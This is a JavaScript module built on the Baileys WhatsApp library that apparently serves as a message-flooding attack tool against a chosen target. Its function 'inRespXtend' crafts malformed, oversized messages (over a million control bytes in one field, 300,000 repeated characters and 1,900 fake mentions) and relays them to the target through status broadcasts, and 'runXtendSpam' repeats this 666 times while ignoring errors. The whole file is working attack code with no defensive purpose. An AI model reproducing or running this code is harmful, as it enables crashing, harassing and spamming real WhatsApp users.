// lib/rizouxtend.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function inRespXtend(sock, target, mention = false) {
  if (!sock || !target) {
    console.error("❌ [inRespXtend Error]: Socket ya Target JID missing hai!");
    return false;
  }

  try {
    let msg1 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "‼️⃟가이Ｒ𝑖𝑧𝑜𝐹𝑢𝑐𝑘 𝑊𝑜𝑟𝑙𝑑.", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "galaxy_message",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "999999"),
      }
    );

    let secondMsgContent = {
      extendedTextMessage: {
        text: "ꦾ".repeat(300000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    };

    const msg2 = generateWAMessageFromContent(target, secondMsgContent, {});

    for (const msg of [msg1, msg2]) {
      try {
        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [target],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
                },
              ],
            },
          ],
        });

        await sleep(500);

        if (mention) {
          await sock.relayMessage(
            target,
            {
              statusMentionMessage: {
                message: {
                  protocolMessage: { key: msg.key.id, type: 25 },
                },
              },
            },
            {}
          );
        }
      } catch (innerErr) {
        // Individual packet error skip taaki loop continuous chale
        continue;
      }
    }
    return true;
  } catch (error) {
    console.error("❌ [inRespXtend Critical Error]:", error);
    return false;
  }
}

async function runXtendSpam(sock, target) {
  console.log(`⚡ [XtendSpam]: Starting heavy loop for ${target}`);
  for (let r = 0; r < 666; r++) {
    await inRespXtend(sock, target, false);
    if (r % 50 === 0 && r > 0) {
      console.log(`🔄 [XtendSpam Progress]: Sent ${r}/666 waves to ${target}`);
    }
  }
  console.log(`✅ [XtendSpam]: Completed sequence for ${target}`);
}

module.exports = { inRespXtend, runXtendSpam };
